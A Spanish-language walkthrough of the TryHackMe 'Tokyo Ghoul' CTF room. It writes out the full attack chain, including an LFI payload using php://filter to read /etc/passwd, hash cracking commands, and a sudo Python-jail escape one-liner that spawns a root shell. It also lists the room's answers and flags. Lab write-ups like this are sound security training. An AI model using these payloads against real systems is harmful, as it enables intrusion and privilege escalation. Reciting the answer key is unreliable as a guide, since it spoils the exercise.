# Tokyo Ghoul

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Web + Linux | tokyoghoul | https://tryhackme.com/room/tokyoghoul | 02 Level Medium | TryHackMe | FTP anónimo, binario cracking, esteganografía, LFI (php://filter), hash cracking, Python jail | Compromiso total del host (root) |

---

**Contexto:** La sala **Tokyo Ghoul** es un CTF Linux inspirado en el anime del mismo nombre cuyo objetivo es "ayudar a Kaneki a escapar de la habitación de Jason". Se comienza con un FTP anónimo del que se descargan un binario (`need_to_talk`) y una imagen. El binario se resuelve con `strings` (clave `kamishiro`) y la imagen esconde una nota en código Morse que revela un directorio oculto (`d1r3c70ry_center`). En la web se explota un **LFI** con `php://filter` para volcar `/etc/passwd`, se obtiene el usuario `kamishiro` y su hash, que se rompe con `john`/`hashcat` (`password123`). Con SSH se llega a un **Python jail** ejecutable como root que se evade mediante manipulación de `__builtins__` para leer la flag final.

## Solucionario

### Task 1: Connect to the Network / Conexión
**Explicación:**

Se requiere la conexión a la red de TryHackMe mediante OpenVPN antes de desplegar la máquina virtual.

| Pregunta | Respuesta |
|----------|-----------|
| Connect to the TryHackMe OpenVPN | `No answer needed` |

### Task 2: Nmap Scan / Escaneo
**Explicación:**

Se ejecuta un escaneo de la máquina para descubrir los servicios y el sistema operativo. En este caso se detectan 3 puertos abiertos y el sistema operativo es Ubuntu.

```bash
nmap -sC -sV <IP>
```

| Pregunta | Respuesta |
|----------|-----------|
| Nmap the target machine. How many ports are open? | `3` |
| What is the OS of the target machine? | `ubuntu` |

### Task 3: Planning to escape / Planificando la fuga
**Explicación:**

En el código fuente de la web aparece un comentario que indica iniciar sesión por FTP como `anonymous`. En el servidor FTP anónimo se encuentra el directorio `need_to_talk` que lleva a `jasonroom.html`. También se descargan el binario `need_to_talk` y la imagen `rize_and_kaneki.jpg`.

El binario pide una passphrase; usando `strings` (o `rabin2 -z`) se revela la palabra `kamishiro` (el apellido de Rize), que actúa como clave y devuelve el texto `You_found_1t`.

```bash
ftp <IP>
# login: anonymous

strings need_to_talk
rabin2 -z need_to_talk
chmod +x need_to_talk
./need_to_talk
# > kamishiro
# Good job. I believe this is what you came for: You_found_1t
```

| Pregunta | Respuesta |
|----------|-----------|
| Is the server provinding some useful information? | `jasonroom.html` |
| What is the key for Rize executable? | `kamishiro` |
| Use a tool to get the other note from Rize. | `No answer needed` |

### Task 4: What Rize is trying to say? / Qué intenta decir Rize
**Explicación:**

La imagen `rize_and_kaneki.jpg` oculta un mensaje en código Morse (esteganografía) que dice "Don't you go anywhere... You're the reason I can be here. We are the one who will change the world... The one who is d1r3c70ry_center..." De ahí se obtiene el directorio oculto `d1r3c70ry_center`. Haciendo enumeración de directorios sobre `http://<IP>/d1r3c70ry_center/` con `gobuster` se descubre `/claim`.

Al pulsar las opciones de la página se llega a `index.php?view=flower.gif`, lo que apunta a un **LFI**. El filtro bloquea payloads clásicos, pero volcando solo los caracteres `/` y `.` con doble URL encoding (por ejemplo `php://filter/convert.base64-encode/resource=../../../../etc/passwd` con los puntos y barras codificados) se consigue leer `/etc/passwd` y obtener el usuario `kamishiro` con su hash `$6$Tb/euwmK$...` (sha512crypt).

```bash
gobuster dir -u http://<IP>/d1r3c70ry_center/ -w /usr/share/wordlists/dirb/common.txt
# http://<IP>/d1r3c70ry_center/claim

# LFI con bypass de filtro (codificando ./)
http://<IP>/d1r3c70ry_center/claim/index.php?view=php://filter/convert.base64-encode/resource=../../../../etc/passwd

echo '<hash>' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# o con hashcat:
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

| Pregunta | Respuesta |
|----------|-----------|
| What the message mean did you understand it? what it says? | `d1r3c70ry_center` |
| Can you see the weakness in the dark? no? just search. | `No answer needed` |
| What did you find something? crack it | `No answer needed` |
| what is rize username? | `kamishiro` |
| what is rize password? | `password123` |

### Task 5: Fight Jason / La batalla contra Jason
**Explicación:**

Con las credenciales `kamishiro:password123` se accede por SSH. En el home se encuentran `user.txt` y el script `jail.py`, que es ejecutable como root vía `sudo -l`. El script filtra palabras como `eval`, `exec`, `import`, `open`, `os`, `read`, `system` y `write`, pero se evade construyendo los nombres con `.lower()` sobre `__builtins__` para ejecutar un `/bin/bash` como root y leer la flag final.

```bash
ssh kamishiro@<IP>
# password: password123

kamishiro@vagrant:~$ cat user.txt
e6215e25c0783eb4279693d9f073594a

kamishiro@vagrant:~$ sudo -l
# (ALL) /usr/bin/python3 /home/kamishiro/jail.py

kamishiro@vagrant:~$ cat jail.py
# for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
#     if keyword in text:
#         print("Do you think i will let you do this ??????")
#         return
# else:
#     exec(text)

kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
root@vagrant:~# cat /root/root.txt
9d790bb87898ca66f724ab05a9e6000b
```

| Pregunta | Respuesta |
|----------|-----------|
| user.txt | `e6215e25c0783eb4279693d9f073594a` |
| root.txt | `9d790bb87898ca66f724ab05a9e6000b` |

### Task 6: Content / Contenido
**Explicación:**

Tarea de finalización de la sala; se han obtenido todas las flags y se entiende la cadena de explotación completa.

| Pregunta | Respuesta |
|----------|-----------|
| Content | `No answer needed` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Connect to the TryHackMe OpenVPN | `No answer needed` |
| 2 | Nmap the target machine. How many ports are open? | `3` |
| 2 | What is the OS of the target machine? | `ubuntu` |
| 3 | Is the server provinding some useful information? | `jasonroom.html` |
| 3 | What is the key for Rize executable? | `kamishiro` |
| 3 | Use a tool to get the other note from Rize. | `No answer needed` |
| 4 | What the message mean did you understand it? what it says? | `d1r3c70ry_center` |
| 4 | Can you see the weakness in the dark? no? just search. | `No answer needed` |
| 4 | What did you find something? crack it | `No answer needed` |
| 4 | what is rize username? | `kamishiro` |
| 4 | what is rize password? | `password123` |
| 5 | user.txt | `e6215e25c0783eb4279693d9f073594a` |
| 5 | root.txt | `9d790bb87898ca66f724ab05a9e6000b` |
| 6 | Content | `No answer needed` |

---

**Metodología:** Enumeración (nmap, FTP anónimo), ingeniería inversa del binario (`strings`), esteganografía + descodificación Morse, enumeración de directorios (gobuster), explotación de LFI con `php://filter` (bypass de filtro), cracking de hash (john/hashcat), acceso SSH y evasión de un Python jail para escalar a root.

### Cadena de ataque / Attack Chain

```
nmap → FTP anónimo → binario need_to_talk (strings → kamishiro) → Morse en imagen → d1r3c70ry_center → gobuster → /claim → LFI php://filter → /etc/passwd → crack hash → kamishiro:password123 → SSH → jail.py (sudo) → evasión de filtro con __builtins__ → root → flags
```

**Learning chain:** Reconocimiento → análisis de binarios → esteganografía → fuzzing web → LFI con bypass → cracking de credenciales → acceso remoto → sandbox/pyjail escape → escalada a root.

**Lección:** *Un filtro de palabras negras en un Python jail se evade trivialmente construyendo los nombres en tiempo de ejecución (`__builtins__['__IMPORT__'.lower()]...`); solo un sandbox de verdad resiste este tipo de escapes.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1083 File and Directory Discovery · T1059 Command and Scripting Interpreter · T1068 Exploitation for Privilege Escalation.

**Fuente:** [TryHackMe - Tokyo Ghoul](https://tryhackme.com/room/tokyoghoul)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.